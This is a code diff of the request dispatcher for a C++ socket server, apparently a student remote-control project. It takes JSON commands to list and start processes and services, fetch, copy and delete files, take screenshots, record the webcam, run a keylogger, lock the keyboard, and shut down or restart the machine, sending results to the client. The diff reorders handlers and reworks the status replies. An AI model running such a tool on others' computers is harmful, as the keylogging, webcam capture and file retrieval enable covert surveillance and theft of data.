@@ -188,7 +188,7 @@ void processRequests(SOCKET& clientSocket, SOCKET& nSocket) {
 			// check if the client wants to end the program
             if (j.contains("title")) {
                 string command = j.at("title");
-                if (command == END_PROGRAM) {
+                if (command == DISCONNECT) {
                     cout << "Exit command received. Closing connection" << endl;
                     break;
 				}
@@ -221,32 +221,10 @@ void processRequest(SOCKET& clientSocket, string request) {
 
     if (j.contains("title")) {
 		string command = j.at("title");
-        if (command == LIST_APP) {
-            jsonResponse = listApp();
-			sendResponse(clientSocket, jsonResponse.dump());
-			if (jsonResponse["status"] == "OK") {
-				sendFile(clientSocket, DATA_FILE);
-			}
-        }
-        else if (command == LIST_SERVICE) {
-            response = listService();
-            sendFile(clientSocket, DATA_FILE);
-            sendResponse(clientSocket, response);
-        }
-        else if (command == LIST_PROCESS) {
-            response = listProcess();
-            sendFile(clientSocket, DATA_FILE);
-            sendResponse(clientSocket, response);
-        }
-        else if (command == START_APP) {
+		cout << "Processing request: " << command << endl;
+        if (command == START_APP) {
             if (j.contains("nameObject")) {
                 response = startApp(j.at("nameObject"));
-                sendResponse(clientSocket, response);
-            }
-        }
-        else if (command == START_SERVICE) {
-            if (j.contains("nameObject")) {
-                response = startService(j.at("nameObject"));
                 sendResponse(clientSocket, response);
             }
         }
@@ -256,64 +234,57 @@ void processRequest(SOCKET& clientSocket, string request) {
                 sendResponse(clientSocket, response);
             }
         }
+        else if (command == LIST_APP) {
+            jsonResponse = listApp();
+			sendResponse(clientSocket, jsonResponse.dump());
+			if (jsonResponse["status"] == "OK") {
+				sendFile(clientSocket, DATA_FILE);
+                cout << "App list sent successfully" << endl;
+			}
+        }
+        else if (command == START_SERVICE) {
+            if (j.contains("nameObject")) {
+                response = startService(j.at("nameObject"));
+                sendResponse(clientSocket, response);
+            }
+        }
         else if (command == STOP_SERVICE) {
             if (j.contains("nameObject")) {
                 response = stopService(j.at("nameObject"));
                 sendResponse(clientSocket, response);
             }
         }
-        else if (command == RESTART) {
-            restart();
-        }
-        else if (command == SHUTDOWN) {
-            shutdown();
-        }
-        else if (command == TURN_ON_WEBCAM) {
-            response = turnOnWebcam();
-            sendResponse(clientSocket, response);
-        }
-        else if (command == TURN_OFF_WEBCAM) {
-            response = turnOffWebcam();
-			sendFile(clientSocket, "output.mp4");
-            sendResponse(clientSocket, response);
-        }
-        else if (command == TAKE_SCREENSHOT) {
-            takeScreenshot();
-
-            json j;
-
-            j["title"] = TAKE_SCREENSHOT;
-
-			// send the screenshot to the client
-            if (sendFile(clientSocket, "screenShot.png")) {
-                j["result"] = "Successfully screenshot";
+        else if (command == LIST_SERVICE) {
+            jsonResponse = listService();
+            sendResponse(clientSocket, jsonResponse.dump());
+            if (jsonResponse["status"] == "OK") {
+                sendFile(clientSocket, DATA_FILE);
+				cout << "Service list sent successfully" << endl;
             }
-            else {
-                j["result"] = "Failed to screenshot";
+        }
+        else if (command == LIST_PROCESS) {
+            jsonResponse = listProcess();
+            sendResponse(clientSocket, jsonResponse.dump());
+            if (jsonResponse["status"] == "OK") {
+                sendFile(clientSocket, DATA_FILE);
+                cout << "Process list sent successfully" << endl;
             }
-
-            response = j.dump();
-            sendResponse(clientSocket, response);
         }
         else if (command == GET_FILE) {
-            json temp;
-
             string fileName = j.at("nameObject");
 
-            j["title"] = GET_FILE;
-
-			// send the file to client
-            if (sendFile(clientSocket, fileName)) {
-                temp["result"] = "File copied and sent successfully";
-                temp["status"] = 1;
-            }
+			ifstream file(fileName, ios::binary);
+			if (!file.is_open()) {
+				jsonResponse["status"] = "FAILED";
+				jsonResponse["result"] = "Failed to open file, check if the file path exists and try again";
+			}
             else {
-                temp["result"] = "Failed to copy file and send it";
-				temp["status"] = 0;
+                jsonResponse["status"] = "OK";
+                jsonResponse["result"] = "File sent successfully";
             }
-
-            response = temp.dump();
-            sendResponse(clientSocket, response);
+            sendResponse(clientSocket, jsonResponse.dump());
+            
+            sendFile(clientSocket, fileName);
         }
         else if (command == COPY_FILE) {
             response = copyFile(j.at("source"), j.at("destination"));
@@ -325,18 +296,34 @@ void processRequest(SOCKET& clientSocket, string request) {
             response = deleteFile(filePath);
             sendResponse(clientSocket, response);
         }
-        else if (command == KEYLOGGER) {
-            string t = j.at("nameObject");
-            int duration = stoi(t);
+        else if (command == TAKE_SCREENSHOT) {
+            if (takeScreenshot()) {
+                jsonResponse["status"] = "OK";
+                jsonResponse["result"] = "Successfully screenshot";
+            }
+            else {
+                jsonResponse["status"] = "FAILED";
+                jsonResponse["result"] = "Failed to screenshot";
+            }
 
-            response = keylogger(duration);
-            sendFile(clientSocket, DATA_FILE);
-            sendResponse(clientSocket, response);
+            sendResponse(clientSocket, jsonResponse.dump());
+            sendFile(clientSocket, "screenShot.png");
+        }
+        else if (command == KEYLOGGER) {
+            int duration = stoi((string)j.at("nameObject"));
+
+            jsonResponse = keylogger(duration);
+            sendResponse(clientSocket, jsonResponse.dump());
+            if (jsonResponse["status"] == "OK") {
+                sendFile(clientSocket, DATA_FILE);
+                cout << "Key list sent successfully" << endl;
+            }
         }
         else if (command == LOCK_KEYBOARD) {
             bool flag = false;
             response = lockKey(flag);
             sendResponse(clientSocket, response);
+            cout << "Request processed" << endl << endl;
 
             if (flag) runKeyLockingLoop();
         }
@@ -344,20 +331,41 @@ void processRequest(SOCKET& clientSocket, string request) {
             response = unlockKey();
             sendResponse(clientSocket, response);
         }
-        else if (command == LIST_DIRECTORY_TREE) {
-            response = listDirectoryTree();
-            sendFile(clientSocket, DATA_FILE);
-			sendResponse(clientSocket, response);
+        else if (command == SHUTDOWN) {
+            shutdown();
         }
-        else {
-            json temp;
-
-            temp["title"] = "Error";
-            temp["result"] = "Your request is invalid. Please review and resend it";
-
-            response = temp.dump();
+        else if (command == RESTART) {
+            restart();
+        }
+        else if (command == LIST_DIRECTORY_TREE) {
+            jsonResponse = listDirectoryTree();
+            sendResponse(clientSocket, jsonResponse.dump());
+            if (jsonResponse["status"] == "OK") {
+                sendFile(clientSocket, DATA_FILE);
+                cout << "Directory tree list sent successfully" << endl;
+            }
+        }
+        else if (command == TURN_ON_WEBCAM) {
+            response = turnOnWebcam();
             sendResponse(clientSocket, response);
         }
+        else if (command == TURN_OFF_WEBCAM) {
+            jsonResponse = turnOffWebcam();
+            sendResponse(clientSocket, jsonResponse.dump());
+            if (jsonResponse["status"] == "OK") {
+                sendFile(clientSocket, VIDEO_FILE);
+                cout << "Record sent successfully" << endl;
+            }
+        }
+        //else {
+        //    json temp;
 
+        //    temp["title"] = "Error";
+        //    temp["result"] = "Your request is invalid. Please review and resend it";
+
+        //    response = temp.dump();
+        //    sendResponse(clientSocket, response);
+        //}
+		cout << "Request processed" << endl << endl;
     }
 }
